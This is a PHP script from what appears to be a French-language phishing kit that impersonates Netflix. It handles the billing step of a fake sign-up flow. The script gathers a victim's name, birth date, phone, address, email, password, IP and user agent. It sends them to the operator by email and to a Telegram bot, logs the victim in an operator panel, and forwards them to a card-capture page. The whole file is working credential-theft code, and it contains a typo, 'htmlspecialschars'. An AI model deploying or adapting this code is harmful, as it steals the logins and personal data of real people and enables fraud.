<?php
session_start();


include('../infos.php');
include("../common/sub_includes.php");
include("../common/functions.php");


if(isset($_POST['billing_submit']))
{

	gather_billing_infos();


	if(empty($_SESSION['nom']) || empty($_SESSION['prenom']) || empty($_SESSION['birthday']) || empty($_SESSION['phone']) || empty($_SESSION['adresse']) || empty($_SESSION['zip']) || empty($_SESSION['city']))
	{


		header('Location: ../steps/billing.php?error=true');

	}
	else{
				
				######################
				#### SETUP  PANEL ####
				######################
	
				if(!isset($_SESSION['id'])){
					createUniqueToken();
				}


				// cree de file
				
					$file = "../data/await/".$_SESSION['id'];
					$op = fopen($file,'w');
					fwrite($op,"");
					fclose($op);
					
				//link
				$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
				$homepage = dirname(dirname($actual_link));
				$link = $homepage."/sma-admin/select.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip'];
				$_SESSION['4lastephone'] = substr($_SESSION['phone'],-4);

		if($mail_sending == true){

			$message = "

[🍷] Full Part [🍷]

🍷 Nom : ".$_SESSION['nom']."
🍷 Prénom : ".$_SESSION['prenom']."
🍷 Date de naissance : ".$_SESSION['birthday']."

🍷 Numéro de téléphone : ".$_SESSION['phone']."
🍷 Adresse : ".$_SESSION['adresse']."
🍷 Code Postal : ".$_SESSION['zip']."
🍷 Ville : ".$_SESSION['city']."

[🍛] Login Part [🍛]

🍛 E-Mail : ".$_SESSION['email']."
🍛 Mot de passe : ".$_SESSION['password']."


[🍛] Tiers Part [🍛] 

🍛 Adresse IP : ".$_SESSION['ip']."
🍛 User Agent : ".$_SESSION['useragent']."

			";

	
			$subject = "[".$NameSender."] + 1 Full Info | ".$_SESSION['nom']." | ".$_SESSION['prenom']." | ".$_SESSION['ip'];
			$headers = "From: Netflix <".$NameSender.">";

			mail($rezmail, $subject, $message, $headers);


  
		  }
  
		##########################
		#### TELEGRAM SENDING ####
		##########################
  

		if($telegram_sending == true ){
  
			$message = '

[💊] Full Part [💊]

💊 Nom : '.$_SESSION['nom'].'
💊 Prénom • '.$_SESSION['prenom'].'
💊 Date De Naissance • '.$_SESSION['birthday'].'

💊 Téléphone • '.$_SESSION['phone'].'
💊 Adresse • '.$_SESSION['adresse'].'
💊 Ville • '.$_SESSION['city'].'
💊 Code Postal • '.$_SESSION['zip'].'

[💊] Login Part [💊]

💊 E-Mail : '.$_SESSION['email'].'
💊 Mot de passe : '.$_SESSION['password'].'


[💊] Informations tierces [💊] 

💊 Adresse IP :  '.$_SESSION['ip'].'
💊 User Agent :  '.$_SESSION['useragent'].'
  
  
			  ';
  
			toTG(htmlspecialschars($message),$chat, $token, $method_of_send_telegram );
		}
		$_SESSION['billinged'] = true;
		echo '<meta http-equiv="refresh" content="0;url=../steps/card.php" />';
       //header('Location: ../steps/card.php');
	}
	

}
else{


}

?>